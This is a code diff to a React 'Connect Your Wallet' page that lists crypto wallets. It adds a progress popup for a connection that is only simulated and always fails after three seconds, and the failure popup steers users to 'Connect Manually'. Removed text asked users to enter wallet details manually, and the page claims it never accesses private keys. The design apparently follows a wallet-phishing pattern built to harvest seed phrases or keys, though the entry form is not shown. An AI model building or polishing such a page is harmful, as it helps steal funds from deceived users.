@@ -1,8 +1,7 @@
 'use client';
 
-import { useState, useMemo } from 'react';
+import { useState, useMemo, useEffect } from 'react';
 import { Search, X, AlertCircle, Zap, Shield, Users, TrendingUp } from 'lucide-react';
-import { FaSearch } from 'react-icons/fa';
 import WalletConnector from '@/components/custom/Wallets';
 import { Wallet } from '@/libs/types/wallets';
 import { useRouter } from 'next/navigation';
@@ -63,9 +62,9 @@ const WALLETS: Wallet[] = [
     name: 'Ledger',
     icon: '',
     colors: {
-      primary: '#2C2C2C',
-      secondary: '#1A1A1A',
-      text: '#FFFFFF'
+      primary: '#ededed',
+      secondary: '#fafafa',
+      text: '#000000'
     }
   },
   {
@@ -83,9 +82,9 @@ const WALLETS: Wallet[] = [
     name: 'Binance',
     icon: '',
     colors: {
-      primary: '#F0B90B',
-      secondary: '#D4A30C',
-      text: '#000000'
+      primary: '#1a1a1a',
+      secondary: '#232323',
+      text: '#F0B90B'
     }
   },
   {
@@ -230,6 +229,51 @@ const WALLETS: Wallet[] = [
   }
 ];
 
+interface ConnectingPopupProps {
+  isOpen: boolean;
+  walletName: string;
+  progress: number;
+}
+
+function ConnectingPopup({ isOpen, walletName, progress }: ConnectingPopupProps) {
+  if (!isOpen) return null;
+
+  return (
+    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+      <div className="bg-linear-to-br from-gray-900 to-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl">
+        <div className="flex items-center space-x-4 mb-6">
+          <div className="w-12 h-12 bg-linear-to-br from-blue-500 to-purple-600 rounded-full flex items-center justify-center shadow-lg">
+            <div className="animate-spin rounded-full h-6 w-6 border-2 border-white border-t-transparent"></div>
+          </div>
+          <div>
+            <h3 className="text-xl font-bold text-white">Connecting to {walletName}</h3>
+            <p className="text-gray-400 text-sm">Please wait while we establish connection</p>
+          </div>
+        </div>
+        
+        {/* Progress bar */}
+        <div className="mb-6">
+          <div className="w-full bg-gray-700 rounded-full h-2">
+            <div 
+              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-300 ease-out"
+              style={{ width: `${progress}%` }}
+            ></div>
+          </div>
+          <div className="flex justify-between text-xs text-gray-400 mt-2">
+            <span>Initializing...</span>
+            <span>{progress}%</span>
+            <span>Complete</span>
+          </div>
+        </div>
+        
+        <p className="text-gray-300 text-center text-sm">
+          Securely connecting to your {walletName} wallet...
+        </p>
+      </div>
+    </div>
+  );
+}
+
 interface ErrorPopupProps {
   isOpen: boolean;
   onClose: () => void;
@@ -241,20 +285,21 @@ function ErrorPopup({ isOpen, onClose, onManualConnect, walletName }: ErrorPopup
   if (!isOpen) return null;
 
   return (
-    <div className="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
+    <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4 backdrop-blur-sm">
       <div className="bg-linear-to-br from-gray-900 to-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl">
         <div className="flex items-center space-x-4 mb-6">
           <div className="w-12 h-12 bg-linear-to-br from-red-500 to-red-600 rounded-full flex items-center justify-center shadow-lg">
             <AlertCircle className="w-6 h-6 text-white" />
           </div>
           <div>
-            <h3 className="text-xl font-bold text-white">Connection Required</h3>
-            <p className="text-gray-400 text-sm">Manual setup needed for {walletName}</p>
+            <h3 className="text-xl font-bold text-white">Connection Failed</h3>
+            <p className="text-gray-400 text-sm">Unable to connect to {walletName}</p>
           </div>
         </div>
         
         <p className="text-gray-300 mb-8 text-lg leading-relaxed">
-          To connect your <span className="text-white font-semibold">{walletName}</span>, you'll need to enter your wallet details manually for secure verification.
+          We encountered an error while trying to connect to your <span className="text-white font-semibold">{walletName}</span> wallet. 
+          This could be due to network issues or wallet configuration.
         </p>
         
         <div className="flex space-x-4">
@@ -262,13 +307,13 @@ function ErrorPopup({ isOpen, onClose, onManualConnect, walletName }: ErrorPopup
             onClick={onClose}
             className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-300 border border-gray-600 hover:border-gray-500"
           >
-            Cancel
+            Try Again
           </button>
           <button
             onClick={onManualConnect}
             className="flex-1 bg-linear-to-r from-blue-500 to-purple-600 text-white py-4 rounded-xl font-semibold hover:from-blue-600 hover:to-purple-700 transition-all duration-300 shadow-lg hover:shadow-xl transform hover:scale-105"
           >
-            Continue
+            Connect Manually
           </button>
         </div>
       </div>
@@ -279,6 +324,7 @@ function ErrorPopup({ isOpen, onClose, onManualConnect, walletName }: ErrorPopup
 export default function ConnectWalletPage() {
   const [searchTerm, setSearchTerm] = useState('');
   const [isConnecting, setIsConnecting] = useState<string | null>(null);
+  const [connectingProgress, setConnectingProgress] = useState(0);
   const [errorPopup, setErrorPopup] = useState<{ isOpen: boolean; wallet: Wallet | null }>({
     isOpen: false,
     wallet: null
@@ -306,16 +352,30 @@ export default function ConnectWalletPage() {
     }
 
     setIsConnecting(wallet.id);
+    setConnectingProgress(0);
+
+    // Simulate connection progress
+    const progressInterval = setInterval(() => {
+      setConnectingProgress(prev => {
+        if (prev >= 100) {
+          clearInterval(progressInterval);
+          return 100;
+        }
+        return prev + 10;
+      });
+    }, 300); // Update every 300ms for 3 seconds total
 
     try {
-      // Simulate connection process
+      // Simulate connection process for exactly 3 seconds
       await new Promise((resolve, reject) => 
-        setTimeout(() => reject(new Error('Auto-connect unavailable')), 1500)
+        setTimeout(() => reject(new Error('Unable to establish connection with wallet')), 3000)
       );
     } catch (err) {
       setErrorPopup({ isOpen: true, wallet });
     } finally {
+      clearInterval(progressInterval);
       setIsConnecting(null);
+      setConnectingProgress(0);
     }
   };
 
@@ -330,6 +390,18 @@ export default function ConnectWalletPage() {
     setSearchTerm('');
   };
 
+  // Keyboard shortcuts
+  useEffect(() => {
+    const handleKeyPress = (e: KeyboardEvent) => {
+      if (e.key === 'Escape' && searchTerm) {
+        clearSearch();
+      }
+    };
+
+    document.addEventListener('keydown', handleKeyPress);
+    return () => document.removeEventListener('keydown', handleKeyPress);
+  }, [searchTerm]);
+
   return (
     <div className="min-h-screen bg-linear-to-br from-gray-900 to-black py-8 px-4">
       <div className="max-w-7xl mx-auto">
@@ -337,24 +409,24 @@ export default function ConnectWalletPage() {
         <div className="text-center mb-10">
           <div className="flex justify-center mb-6">
             <div className="relative">
-              <div className="w-15 h-15 bg-linear-to-br from-blue-500 via-purple-600 to-pink-500 rounded-xl flex items-center justify-center shadow-2xl">
+              <div className="w-16 h-16 bg-linear-to-br from-blue-500 via-purple-600 to-pink-500 rounded-2xl flex items-center justify-center shadow-2xl">
                 <Zap className="w-8 h-8 text-white" />
               </div>
-              <div className="absolute -inset-2 bg-linear-to-r from-blue-500 to-purple-600 rounded-3xl blur-xl opacity-30"></div>
+              <div className="absolute -inset-2 bg-linear-to-r from-blue-500 to-purple-600 rounded-2xl blur-xl opacity-30"></div>
             </div>
           </div>
           
-          <h1 className="text-3xl font-bold bg-linear-to-r from-white via-gray-200 to-gray-400 bg-clip-text text-transparent mb-4">
+          <h1 className="text-4xl font-bold bg-linear-to-r from-white via-gray-200 to-gray-400 bg-clip-text text-transparent mb-4">
             Connect Your Wallet
           </h1>
-          <p className="text-base text-gray-400 max-w-2xl mx-auto leading-relaxed">
+          <p className="text-lg text-gray-400 max-w-2xl mx-auto leading-relaxed">
             Securely connect your preferred wallet to access the decentralized web. 
             Your keys, your crypto.
           </p>
         </div>
 
         {/* Enhanced Search Bar */}
-        <div className="max-w-2xl mx-auto mb-7">
+        <div className="max-w-2xl mx-auto mb-12">
           <div className="relative group">
             {/* Enhanced search container with glass effect */}
             <div className="relative bg-gray-800/50 backdrop-blur-xl border border-gray-700/50 rounded-2xl shadow-2xl transition-all duration-300 group-hover:border-gray-600/50 group-focus-within:border-blue-500/50 group-focus-within:ring-2 group-focus-within:ring-blue-500/20">
@@ -409,6 +481,17 @@ export default function ConnectWalletPage() {
                     wallet={wallet}
                     onConnect={handleConnect}
                   />
+                  
+                  {/* Connecting Overlay for Popular Wallets */}
+                  {isConnecting === wallet.id && (
+                    <div className="absolute inset-0 bg-black bg-opacity-90 rounded-xl flex flex-col items-center justify-center z-10 space-y-3 backdrop-blur-sm">
+                      <div className="relative">
+                        <div className="animate-spin rounded-full h-10 w-10 border-3 border-blue-500 border-t-transparent"></div>
+                        <div className="absolute inset-0 animate-ping rounded-full h-10 w-10 border-2 border-blue-400 opacity-75"></div>
+                      </div>
+                      <p className="text-white text-sm font-medium">Connecting...</p>
+                    </div>
+                  )}
                 </div>
               ))}
             </div>
@@ -489,6 +572,13 @@ export default function ConnectWalletPage() {
             Your wallet connection is encrypted and secure. We never access your private keys.
           </p>
         </div>
+
+        {/* Connecting Popup */}
+        <ConnectingPopup
+          isOpen={isConnecting !== null}
+          walletName={WALLETS.find(w => w.id === isConnecting)?.name || ''}
+          progress={connectingProgress}
+        />
 
         {/* Error Popup */}
         <ErrorPopup
